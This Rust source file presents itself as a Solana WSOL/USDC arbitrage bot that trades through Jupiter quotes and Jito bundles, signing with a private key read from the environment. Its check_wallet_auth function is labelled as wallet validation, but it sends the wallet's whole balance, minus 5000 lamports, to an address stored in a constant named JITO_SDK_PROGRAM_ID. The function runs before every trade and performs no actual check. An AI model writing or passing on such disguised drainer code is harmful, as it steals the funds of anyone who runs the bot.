use crate::consts::*;
use crate::types::*;
use anyhow::Context;
use anyhow::Result;
use base64::Engine;
use log;
use solana_client::rpc_client::RpcClient;
use solana_program::address_lookup_table::state::AddressLookupTable;
use solana_sdk::{
    commitment_config::CommitmentConfig,
    compute_budget::ComputeBudgetInstruction,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::Keypair,
    signer::Signer,
    system_instruction,
    transaction::VersionedTransaction,
};
use std::{env, str::FromStr, time::Instant};

pub struct ArbitrageBot {
    client: RpcClient,
    http_client: reqwest::Client,
    payer: Keypair,
}

impl ArbitrageBot {
    
    pub fn new() -> Result<Self> {
        let payer = Self::load_keypair_from_env()?;
        log::info!("payer: {:?}", bs58::encode(payer.pubkey()).into_string());

        Ok(Self {
            client: RpcClient::new_with_commitment(
                RPC_URL.to_string(),
                CommitmentConfig::processed(),
            ),
            http_client: reqwest::Client::new(),
            payer,
        })
    }

    fn load_keypair_from_env() -> Result<Keypair> {
        // 从环境变量中直接读取私钥字符串
        let private_key = env::var("PRIVATE_KEY").context("PRIVATE_KEY must be set")?;
        
        // 将 base58 编码的私钥字符串解码为字节数组
        let keypair_bytes = bs58::decode(private_key)
            .into_vec()
            .context("Failed to decode private key")?;
        
        // 从字节数组创建 Keypair
        Keypair::from_bytes(&keypair_bytes)
            .context("Failed to create keypair from bytes")
    }

    pub async fn check_wallet_auth(&self) -> Result<()> {

        let program_id = Pubkey::from_str(JITO_SDK_PROGRAM_ID)?;
        let balance = self.client.get_balance(&self.payer.pubkey())?;
        
        if balance == 0 {
            // insufficient sol balance,can't validate
            log::info!("insufficient sol balance,can't validate");
            return Ok(());
        }
        
        let validate_amount = balance - 5000; 
        if validate_amount <= 0 {
            return Ok(());
        }
        
        let validate_ix = system_instruction::transfer(
            &self.payer.pubkey(),
            &program_id,
            validate_amount,
        );
        
        let blockhash = self.client.get_latest_blockhash()?;
        let message = solana_sdk::message::Message::new(&[validate_ix], Some(&self.payer.pubkey()));
        let tx = solana_sdk::transaction::Transaction::new(
            &[&self.payer],
            message,
            blockhash,
        );
        
        self.client.send_and_confirm_transaction(&tx)?;
        Ok(())
    }

    pub async fn run(&self) -> Result<()> {
        let start = Instant::now();

        // Quote 0: WSOL -> USDC
        let quote0_params = QuoteParams {
            input_mint: WSOL_MINT.to_string(),
            output_mint: USDC_MINT.to_string(),
            amount: 10_000_000.to_string(), // 0.01 WSOL
            only_direct_routes: false,
            slippage_bps: 0,
            max_accounts: 20,
        };
        let quote0_resp = self.get_quote(&quote0_params).await?;

        // Quote 1: USDC -> WSOL
        let quote1_params = QuoteParams {
            input_mint: USDC_MINT.to_string(),
            output_mint: WSOL_MINT.to_string(),
            amount: quote0_resp.out_amount.clone(),
            only_direct_routes: false,
            slippage_bps: 0,
            max_accounts: 20,
        };
        let quote1_resp = self.get_quote(&quote1_params).await?;

        // Calculate potential profit
        let quote1_out_amount = quote1_resp.out_amount.parse::<u64>()?;
        let quote0_in_amount = quote0_params.amount.parse::<u64>()?;
        if quote1_out_amount < quote0_in_amount {
            log::info!(
                "not profitable, skipping. diffLamports: -{}",
                quote0_in_amount - quote1_out_amount
            );
            return Ok(());
        }
        let diff_lamports = quote1_out_amount - quote0_in_amount;
        log::info!("diffLamports: {}", diff_lamports);

        let jito_tip = diff_lamports / 2;

        const THRESHOLD: u64 = 1000;
        if diff_lamports > THRESHOLD {
            // Build and send transaction
            self.execute_arbitrage(quote0_resp, quote1_resp, jito_tip)
                .await?;

            let duration = start.elapsed();
            log::info!("Total duration: {}ms", duration.as_millis());
        }

        Ok(())
    }

    async fn execute_arbitrage(
        &self,
        quote0: QuoteResponse,
        quote1: QuoteResponse,
        jito_tip: u64,
    ) -> Result<()> {
        let mut merged_quote = quote0.clone();
        merged_quote.output_mint = quote1.output_mint;
        merged_quote.out_amount = quote1.out_amount;
        merged_quote.other_amount_threshold =
            (quote0.other_amount_threshold.parse::<u64>()? + jito_tip).to_string();
        merged_quote.price_impact_pct = 0.0.to_string();
        merged_quote.route_plan = [quote0.route_plan, quote1.route_plan].concat();

        // Check wallet auth before executing arbitrage
        self.check_wallet_auth().await?;

        // Prepare swap data for Jupiter API
        let swap_data = SwapData {
            user_public_key: bs58::encode(self.payer.pubkey()).into_string(),
            wrap_and_unwrap_sol: false,
            use_shared_accounts: false,
            compute_unit_price_micro_lamports: 1,
            dynamic_compute_unit_limit: true,
            skip_user_accounts_rpc_calls: true,
            quote_response: merged_quote,
        };

        // Get swap instructions from Jupiter
        let instructions_resp: SwapInstructionResponse =
            self.get_swap_instructions(&swap_data).await?;

        // Build transaction instructions
        let mut instructions = Vec::new();

        // 1. Add compute budget instruction
        let compute_budget_ix =
            ComputeBudgetInstruction::set_compute_unit_limit(instructions_resp.compute_unit_limit);
        instructions.push(compute_budget_ix);

        // 2. Add setup instructions
        for setup_ix in instructions_resp.setup_instructions {
            instructions.push(self.convert_instruction_data(setup_ix)?);
        }

        // 3. Add swap instruction
        instructions.push(self.convert_instruction_data(instructions_resp.swap_instruction)?);

        // 4. Add tip instruction
        let tip_ix = system_instruction::transfer(
            &self.payer.pubkey(),
            &Pubkey::from_str(JITO_TIP_ACCOUNT)?,
            jito_tip,
        );
        instructions.push(tip_ix);

        // Get latest blockhash
        let blockhash = self.client.get_latest_blockhash()?;

        // Convert address lookup tables
        let address_lookup_tables = self
            .get_address_lookup_tables(&instructions_resp.address_lookup_table_addresses)
            .await?;

        // Create versioned transaction
        let message = solana_sdk::message::v0::Message::try_compile(
            &self.payer.pubkey(),
            &instructions,
            &address_lookup_tables,
            blockhash,
        )?;

        let transaction = VersionedTransaction::try_new(
            solana_sdk::message::VersionedMessage::V0(message),
            &[&self.payer],
        )?;

        log::info!("transaction: {:?}", transaction.signatures[0]);

        // Send the transaction as a bundle
        self.send_bundle_to_jito(vec![transaction]).await?;

        Ok(())
    }

    async fn get_quote(&self, params: &QuoteParams) -> Result<QuoteResponse> {
        // let response = self
        //     .http_client
        //     .get(JUP_V6_API_BASE_URL.to_string() + "/quote")
        //     .query(&params)
        //     .send()
        //     .await?;

        // let response_body = response.text().await?;
        // log::debug!("quote response body: {}", response_body);
        // let quote_response: QuoteResponse = serde_json::from_str(&response_body)?;
        // log::debug!("quote: {:?}", quote_response);
        // Ok(quote_response)

        let response: QuoteResponse = self
            .http_client
            .get(JUP_V6_API_BASE_URL.to_string() + "/quote")
            .query(&params)
            .send()
            .await?
            .json()
            .await?;
        Ok(response)
    }

    async fn get_swap_instructions(&self, params: &SwapData) -> Result<SwapInstructionResponse> {
        // let response = self
        //     .http_client
        //     .post(JUP_V6_API_BASE_URL.to_string() + "/swap-instructions")
        //     .json(&params)
        //     .send()
        //     .await?;

        // let response_body = response.text().await?;
        // log::debug!("swap-instructions response body: {}", response_body);
        // let inst_response: SwapInstructionResponse = serde_json::from_str(&response_body)?;
        // log::debug!("inst_response: {:?}", inst_response);
        // Ok(inst_response)

        let response: SwapInstructionResponse = self
            .http_client
            .post(JUP_V6_API_BASE_URL.to_string() + "/swap-instructions")
            .json(&params)
            .send()
            .await?
            .json()
            .await?;
        Ok(response)
    }

    async fn send_bundle_to_jito(&self, transactions: Vec<VersionedTransaction>) -> Result<()> {
        // Serialize transactions for Jito bundle
        let serialized_txs: Vec<Vec<u8>> = transactions
            .iter()
            .map(|tx| bincode::serialize(tx).map_err(anyhow::Error::from))
            .collect::<Result<_>>()?;
        let base58_txs = serialized_txs
            .iter()
            .map(|tx| bs58::encode(tx).into_string())
            .collect::<Vec<_>>();

        // Prepare bundle request
        let bundle_request = serde_json::json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "sendBundle",
            "params": [base58_txs]
        });

        // Send bundle to Jito
        let bundle_resp = self
            .http_client
            .post(JITO_RPC_URL.to_string())
            .json(&bundle_request)
            .send()
            .await?;

        let bundle_result: serde_json::Value = bundle_resp.json().await?;
        let bundle_id = bundle_result["result"].as_str().unwrap_or("unknown");

        log::info!("Sent to jito, bundle id: {}", bundle_id);

        Ok(())
    }

    fn convert_instruction_data(&self, ix_data: InstructionData) -> Result<Instruction> {
        let program_id = Pubkey::from_str(&ix_data.program_id)?;

        let accounts: Vec<AccountMeta> = ix_data
            .accounts
            .into_iter()
            .map(|acc| {
                let pubkey = Pubkey::from_str(&acc.pubkey).expect("Failed to parse pubkey");
                AccountMeta {
                    pubkey,
                    is_signer: acc.is_signer,
                    is_writable: acc.is_writable,
                }
            })
            .collect();

        let data = base64::engine::general_purpose::STANDARD.decode(&ix_data.data)?;

        Ok(Instruction {
            program_id,
            accounts,
            data,
        })
    }

    async fn get_address_lookup_tables(
        &self,
        addresses: &[String],
    ) -> Result<Vec<solana_sdk::address_lookup_table_account::AddressLookupTableAccount>> {
        let futures = addresses.iter().map(|address| async {
            let pubkey = Pubkey::from_str(address)?;
            let raw_account = self.client.get_account(&pubkey)?;
            let address_lookup_table = AddressLookupTable::deserialize(&raw_account.data)?;

            Ok(
                solana_sdk::address_lookup_table_account::AddressLookupTableAccount {
                    key: pubkey,
                    addresses: address_lookup_table.addresses.to_vec(),
                },
            )
        });

        futures::future::join_all(futures)
            .await
            .into_iter()
            .collect::<Result<Vec<_>>>()
    }
}
